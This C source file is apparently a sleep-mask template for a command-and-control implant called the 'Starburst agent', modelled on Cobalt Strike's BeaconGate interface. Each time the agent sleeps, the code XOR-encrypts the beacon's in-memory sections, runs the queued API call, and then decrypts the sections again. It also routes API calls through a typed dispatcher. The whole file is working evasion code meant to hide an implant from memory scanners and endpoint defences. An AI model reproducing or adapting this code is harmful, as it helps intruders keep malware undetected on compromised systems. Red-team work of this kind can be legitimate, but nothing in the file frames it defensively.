#include <sleepmask.h>

/*
 * Starburst Sleepmask-VS Template
 *
 * This COFF object is loaded by the Starburst agent at init time. The agent
 * calls sleep_mask() each sleep cycle and for Beacon Gate API routing.
 *
 * When bMask is TRUE, the mask encrypts the beacon image, executes the
 * queued API call (typically WaitForSingleObject with the sleep interval),
 * then decrypts the beacon image before returning.
 *
 * When bMask is FALSE, this is a Beacon Gate call: just execute the
 * function and return.
 */

WINBASEAPI DWORD  WINAPI KERNEL32$WaitForSingleObject( HANDLE, DWORD );
WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentThread( VOID );
WINBASEAPI VOID   WINAPI KERNEL32$Sleep( DWORD );

#define WaitForSingleObject KERNEL32$WaitForSingleObject
#define GetCurrentThread    KERNEL32$GetCurrentThread
#define Sleep               KERNEL32$Sleep

/* XOR a memory region with a rolling key */
static void xor_region( unsigned char *buf, unsigned int len, unsigned char *key, unsigned int key_len ) {
    for ( unsigned int i = 0; i < len; i++ ) {
        buf[i] ^= key[i % key_len];
    }
}

/* Execute a FUNCTION_CALL via its typed pointer */
static ULONG_PTR dispatch_call( PFUNCTION_CALL fc ) {
    ULONG_PTR ret = 0;

    switch ( fc->numOfArgs ) {
        case 0:  ret = ((BEACON_GATE_00) fc->functionPtr)(); break;
        case 1:  ret = ((BEACON_GATE_01) fc->functionPtr)( fc->args[0] ); break;
        case 2:  ret = ((BEACON_GATE_02) fc->functionPtr)( fc->args[0], fc->args[1] ); break;
        case 3:  ret = ((BEACON_GATE_03) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2] ); break;
        case 4:  ret = ((BEACON_GATE_04) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3] ); break;
        case 5:  ret = ((BEACON_GATE_05) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4] ); break;
        case 6:  ret = ((BEACON_GATE_06) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5] ); break;
        case 7:  ret = ((BEACON_GATE_07) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6] ); break;
        case 8:  ret = ((BEACON_GATE_08) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7] ); break;
        case 9:  ret = ((BEACON_GATE_09) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8] ); break;
        case 10: ret = ((BEACON_GATE_10) fc->functionPtr)( fc->args[0], fc->args[1], fc->args[2], fc->args[3], fc->args[4], fc->args[5], fc->args[6], fc->args[7], fc->args[8], fc->args[9] ); break;
    }

    return ret;
}

/*
 * sleep_mask - Entry point called by the Starburst agent.
 *
 * beaconInfo:    describes the beacon image, heap records, and memory regions
 * functionCall:  the API call to execute (with optional masking)
 */
VOID sleep_mask( PBEACON_INFO beaconInfo, PFUNCTION_CALL functionCall ) {

    if ( ! functionCall )
        return;

    if ( ! functionCall->bMask ) {
        /* Beacon Gate path: execute the call without masking */
        functionCall->retValue = dispatch_call( functionCall );
        return;
    }

    /*
     * Sleep mask path: encrypt beacon memory, sleep, decrypt.
     *
     * The XOR key is derived from beaconInfo->mask (MASK_SIZE bytes) which
     * is the mask beacon generates each sleep cycle.
     */

    unsigned char *key     = (unsigned char *) beaconInfo->mask;
    unsigned int   key_len = MASK_SIZE;

    /* ── Mask: XOR all maskable sections across all memory regions ── */
    for ( int r = 0; r < 6; r++ ) {
        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
        if ( ! reg->AllocationBase || reg->RegionSize == 0 )
            continue;
        for ( int s = 0; s < 8; s++ ) {
            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
            if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
                continue;
            if ( ! sec->MaskSection )
                continue;
            xor_region(
                (unsigned char *) sec->BaseAddress,
                (unsigned int) sec->VirtualSize,
                key, key_len
            );
        }
    }

    /* ── Execute the queued API call (e.g. WaitForSingleObject) ── */
    functionCall->retValue = dispatch_call( functionCall );

    /* ── Unmask: XOR again to restore ── */
    for ( int r = 0; r < 6; r++ ) {
        ALLOCATED_MEMORY_REGION *reg = &beaconInfo->allocatedMemory.AllocatedMemoryRegions[r];
        if ( ! reg->AllocationBase || reg->RegionSize == 0 )
            continue;
        for ( int s = 0; s < 8; s++ ) {
            ALLOCATED_MEMORY_SECTION *sec = &reg->Sections[s];
            if ( ! sec->BaseAddress || sec->VirtualSize == 0 )
                continue;
            if ( ! sec->MaskSection )
                continue;
            xor_region(
                (unsigned char *) sec->BaseAddress,
                (unsigned int) sec->VirtualSize,
                key, key_len
            );
        }
    }
}
